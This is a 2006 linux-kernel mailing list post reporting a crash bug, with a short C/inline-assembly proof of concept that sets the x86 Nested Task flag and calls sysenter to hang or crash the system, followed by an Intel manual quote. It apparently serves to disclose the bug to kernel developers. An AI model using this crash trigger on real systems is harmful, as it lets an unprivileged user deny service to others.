Return-Path: <linux-kernel-owner+willy=40w.ods.org-S965148AbWIQXI1@vger.kernel.org>
Received: (majordomo@vger.kernel.org) by vger.kernel.org via listexpand
	id S965148AbWIQXI1 (ORCPT <rfc822;willy@w.ods.org>);
	Sun, 17 Sep 2006 19:08:27 -0400
Received: (majordomo@vger.kernel.org) by vger.kernel.org id S965149AbWIQXI1
	(ORCPT <rfc822;linux-kernel-outgoing>);
	Sun, 17 Sep 2006 19:08:27 -0400
Received: from py-out-1112.google.com ([64.233.166.179]:50113 "EHLO
	py-out-1112.google.com") by vger.kernel.org with ESMTP
	id S965148AbWIQXI1 (ORCPT <rfc822;linux-kernel@vger.kernel.org>);
	Sun, 17 Sep 2006 19:08:27 -0400
DomainKey-Signature: a=rsa-sha1; q=dns; c=nofws;
        s=beta; d=gmail.com;
        h=received:message-id:date:from:to:subject:in-reply-to:mime-version:content-type:content-transfer-encoding:content-disposition:references;
        b=WwgFmPhHXkB8KGF3LAJdqbMUND1tVMlVLSU+d9gwRj+W50Vva6+NAXF7TV8iCtz5DjJuxwu2+H5rgOc49OKpL7AZBRyC5vR7BKrGzoumg4EPuGcEE5IJSpxI+4Gqbp7aI4+gXKla88e1W9sIxKBRNmqF3puNDIQA3e9aRHz+U5A=
Message-ID: <5a20704e0609171608o7ee45fdbxb94aa897c1776153@mail.gmail.com>
Date: Sun, 17 Sep 2006 19:08:24 -0400
From: "In Cognito" <defend.the.world@gmail.com>
To: linux-kernel@vger.kernel.org
Subject: Sysenter crash with Nested Task Bit set
In-Reply-To: <5a20704e0609171603s55ca52bap71dc2fa2c05d6741@mail.gmail.com>
MIME-Version: 1.0
Content-Type: text/plain; charset=ISO-8859-1; format=flowed
Content-Transfer-Encoding: 7bit
Content-Disposition: inline
References: <5a20704e0609171603s55ca52bap71dc2fa2c05d6741@mail.gmail.com>
Sender: linux-kernel-owner@vger.kernel.org
X-Mailing-List: linux-kernel@vger.kernel.org

Here's a way to heat up your cpu and crash the rest of the system too:

main(){
asm("pushf\n"
        "popl %eax\n"
/* enable the NT bit */
        "orl $0x4000, %eax\n"
        "pushl %eax\n"
        "popf\n"

        "sysenter\n"
       );
return 0;
}

"If NT equals 1, IRET reverses the operation of a CALL or INT that
caused a task switch. The updated state of the task executing IRET is
saved in its task state segment. If the task is reentered later, the
code that follows IRET is executed."
- Intel 80386 Reference Programmer's Manual
